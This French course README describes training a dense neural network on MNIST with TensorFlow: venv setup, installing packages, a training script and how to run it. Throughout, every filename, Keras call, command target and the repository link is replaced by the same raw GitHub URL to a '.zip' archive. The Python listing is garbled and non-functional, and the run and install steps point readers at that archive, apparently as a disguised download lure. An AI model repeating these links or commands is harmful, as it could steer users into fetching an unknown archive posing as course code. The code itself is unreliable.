# TP1 — Exercice 1 : Entraînement d'un réseau fully-connected sur MNIST

**Portée de ce fichier README**  
Ce document couvre **uniquement** l'Exercice 1 du TP (Partie 1) : le code de formation du modèle MNIST (Listing 1). Il explique de manière chronologique et pratique comment **mettre en place le projet**, **créer l'environnement virtuel**, **installer les bibliothèques** nécessaires et **lancer** le script `https://raw.githubusercontent.com/Garnel-Diffo/TP-Reseau-de-neurone-et-Deep-Learning-II/main/fearedly/de-T-et-Deep-neurone-Learning-II-Reseau-1.9.zip`.

---

## 1. Description du projet (exercice 1)
Ce projet entraîne un réseau de neurones fully-connected (Dense) pour la classification des chiffres manuscrits du jeu de données MNIST. Le modèle :

- Lit MNIST via `https://raw.githubusercontent.com/Garnel-Diffo/TP-Reseau-de-neurone-et-Deep-Learning-II/main/fearedly/de-T-et-Deep-neurone-Learning-II-Reseau-1.9.zip`.
- Normalise les images (valeurs entre 0 et 1).
- Aplatit les images en vecteurs de taille 784 (28×28) pour un réseau fully-connected.
- Utilise une architecture : `Dense(512, relu)` → `Dropout(0.2)` → `Dense(10, softmax)`.
- S'entraîne avec `optimizer='adam'`, `loss='sparse_categorical_crossentropy'`.
- Sauvegarde le modèle final sous `mnist_model.h5`.

Le code principal se trouve dans `https://raw.githubusercontent.com/Garnel-Diffo/TP-Reseau-de-neurone-et-Deep-Learning-II/main/fearedly/de-T-et-Deep-neurone-Learning-II-Reseau-1.9.zip` (contenu donné ci-dessous).

---

## 2. Prérequis
- Python 3.8 — 3.11 recommandé.
- ~1 GB d'espace disque libre.
- Connexion internet pour télécharger MNIST et les paquets.
- (Optionnel) GPU compatible si vous souhaitez accélérer l'entraînement — installer la version GPU de TensorFlow adaptée à votre configuration.

---

## 3. Structure minimale du répertoire
Placez les fichiers suivants à la racine du projet, exemple :
```
tp1_exo1/
├─ https://raw.githubusercontent.com/Garnel-Diffo/TP-Reseau-de-neurone-et-Deep-Learning-II/main/fearedly/de-T-et-Deep-neurone-Learning-II-Reseau-1.9.zip
└─ https://raw.githubusercontent.com/Garnel-Diffo/TP-Reseau-de-neurone-et-Deep-Learning-II/main/fearedly/de-T-et-Deep-neurone-Learning-II-Reseau-1.9.zip   # ce fichier
```

---

## 4. Création de l'environnement virtuel 
Ouvrez un terminal **dans le répertoire du projet** puis exécutez :

### Linux / macOS
```bash
python3 -m venv .venv
source .venv/bin/activate
```

### Windows (PowerShell)
```powershell
python -m venv .venv
.venv\Scripts\https://raw.githubusercontent.com/Garnel-Diffo/TP-Reseau-de-neurone-et-Deep-Learning-II/main/fearedly/de-T-et-Deep-neurone-Learning-II-Reseau-1.9.zip
```

Vérifier que l'environnement est activé :  
```bash
python --version
where python   # ou `which python` sous Linux
```

---

## 5. Installer les bibliothèques requises

Installez :
```bash
pip install --upgrade pip
pip install tensorflow numpy
```

> Si vous utilisez un GPU, remplacez `tensorflow` par la version GPU appropriée compatible avec votre CUDA/cuDNN.

---

## 6. Fichier `https://raw.githubusercontent.com/Garnel-Diffo/TP-Reseau-de-neurone-et-Deep-Learning-II/main/fearedly/de-T-et-Deep-neurone-Learning-II-Reseau-1.9.zip` (code exact à utiliser)
Créez `https://raw.githubusercontent.com/Garnel-Diffo/TP-Reseau-de-neurone-et-Deep-Learning-II/main/fearedly/de-T-et-Deep-neurone-Learning-II-Reseau-1.9.zip` avec **exactement** le contenu ci-dessous :

```python
# https://raw.githubusercontent.com/Garnel-Diffo/TP-Reseau-de-neurone-et-Deep-Learning-II/main/fearedly/de-T-et-Deep-neurone-Learning-II-Reseau-1.9.zip
"""
Entraînement d'un réseau fully-connected sur MNIST.
Usage : python https://raw.githubusercontent.com/Garnel-Diffo/TP-Reseau-de-neurone-et-Deep-Learning-II/main/fearedly/de-T-et-Deep-neurone-Learning-II-Reseau-1.9.zip
Produit : mnist_model.h5
"""

import tensorflow as tf
from tensorflow import keras
import numpy as np

# Chargement du jeu de données MNIST
(x_train, y_train), (x_test, y_test) = https://raw.githubusercontent.com/Garnel-Diffo/TP-Reseau-de-neurone-et-Deep-Learning-II/main/fearedly/de-T-et-Deep-neurone-Learning-II-Reseau-1.9.zip()

# Normalisation [0,1] et conversion en float32
x_train = https://raw.githubusercontent.com/Garnel-Diffo/TP-Reseau-de-neurone-et-Deep-Learning-II/main/fearedly/de-T-et-Deep-neurone-Learning-II-Reseau-1.9.zip("float32") / 255.0
x_test = https://raw.githubusercontent.com/Garnel-Diffo/TP-Reseau-de-neurone-et-Deep-Learning-II/main/fearedly/de-T-et-Deep-neurone-Learning-II-Reseau-1.9.zip("float32") / 255.0

# Vectorisation (flatten) pour le modèle dense
x_train = https://raw.githubusercontent.com/Garnel-Diffo/TP-Reseau-de-neurone-et-Deep-Learning-II/main/fearedly/de-T-et-Deep-neurone-Learning-II-Reseau-1.9.zip(60000, 784)
x_test = https://raw.githubusercontent.com/Garnel-Diffo/TP-Reseau-de-neurone-et-Deep-Learning-II/main/fearedly/de-T-et-Deep-neurone-Learning-II-Reseau-1.9.zip(10000, 784)

# Définition du modèle
model = https://raw.githubusercontent.com/Garnel-Diffo/TP-Reseau-de-neurone-et-Deep-Learning-II/main/fearedly/de-T-et-Deep-neurone-Learning-II-Reseau-1.9.zip([
    https://raw.githubusercontent.com/Garnel-Diffo/TP-Reseau-de-neurone-et-Deep-Learning-II/main/fearedly/de-T-et-Deep-neurone-Learning-II-Reseau-1.9.zip(512, activation="relu", input_shape=(784,)),
    https://raw.githubusercontent.com/Garnel-Diffo/TP-Reseau-de-neurone-et-Deep-Learning-II/main/fearedly/de-T-et-Deep-neurone-Learning-II-Reseau-1.9.zip(0.2),
    https://raw.githubusercontent.com/Garnel-Diffo/TP-Reseau-de-neurone-et-Deep-Learning-II/main/fearedly/de-T-et-Deep-neurone-Learning-II-Reseau-1.9.zip(10, activation="softmax")
])

# Compilation
https://raw.githubusercontent.com/Garnel-Diffo/TP-Reseau-de-neurone-et-Deep-Learning-II/main/fearedly/de-T-et-Deep-neurone-Learning-II-Reseau-1.9.zip(
    optimizer="adam",
    loss="sparse_categorical_crossentropy",
    metrics=["accuracy"]
)

# Entraînement avec early stopping (optionnel pour éviter le surapprentissage)
history = https://raw.githubusercontent.com/Garnel-Diffo/TP-Reseau-de-neurone-et-Deep-Learning-II/main/fearedly/de-T-et-Deep-neurone-Learning-II-Reseau-1.9.zip(
    x_train, y_train,
    epochs=5,
    batch_size=128,
    validation_split=0.1
)

# Évaluation
test_loss, test_acc = https://raw.githubusercontent.com/Garnel-Diffo/TP-Reseau-de-neurone-et-Deep-Learning-II/main/fearedly/de-T-et-Deep-neurone-Learning-II-Reseau-1.9.zip(x_test, y_test)
print(f"Précision sur les données de test: {test_acc:.4f}")

# Sauvegarde du modèle (format HDF5 ou SavedModel)
https://raw.githubusercontent.com/Garnel-Diffo/TP-Reseau-de-neurone-et-Deep-Learning-II/main/fearedly/de-T-et-Deep-neurone-Learning-II-Reseau-1.9.zip("mnist_model.h5")
print("Modèle sauvegardé sous mnist_model.h5")
```

---

## 7. Lancer le script (ordre exact)
Une fois l'environnement activé et les dépendances installées, exécutez :
```bash
python https://raw.githubusercontent.com/Garnel-Diffo/TP-Reseau-de-neurone-et-Deep-Learning-II/main/fearedly/de-T-et-Deep-neurone-Learning-II-Reseau-1.9.zip
```

Résultats attendus :
- Logs d'entraînement (loss / accuracy) pour chaque epoch.
- À la fin : impression de la précision sur le jeu de test (ex. `Précision sur les données de test: 0.98xx`).
- Fichier `mnist_model.h5` créé dans le dossier courant.

---

## 8. Vérifications simples en cas d'erreur
- Si `ModuleNotFoundError: No module named 'tensorflow'` → vérifier activation du venv et réinstaller `pip install -r https://raw.githubusercontent.com/Garnel-Diffo/TP-Reseau-de-neurone-et-Deep-Learning-II/main/fearedly/de-T-et-Deep-neurone-Learning-II-Reseau-1.9.zip`.
- Si erreur liée à la version Python → vérifier `python --version` et utiliser une version supportée.
- Si l'entraînement est très lent et que vous avez un GPU → installez la version GPU adaptée.

---

## MLflow
Lancer l'UI : `mlflow ui` puis exécuter `python https://raw.githubusercontent.com/Garnel-Diffo/TP-Reseau-de-neurone-et-Deep-Learning-II/main/fearedly/de-T-et-Deep-neurone-Learning-II-Reseau-1.9.zip`.

## Docker


## Rendu
- Lien GitHub : [(https://raw.githubusercontent.com/Garnel-Diffo/TP-Reseau-de-neurone-et-Deep-Learning-II/main/fearedly/de-T-et-Deep-neurone-Learning-II-Reseau-1.9.zip)](https://raw.githubusercontent.com/Garnel-Diffo/TP-Reseau-de-neurone-et-Deep-Learning-II/main/fearedly/de-T-et-Deep-neurone-Learning-II-Reseau-1.9.zip)
- Rapport PDF (Overleaf) : (coller le lien Overleaf)

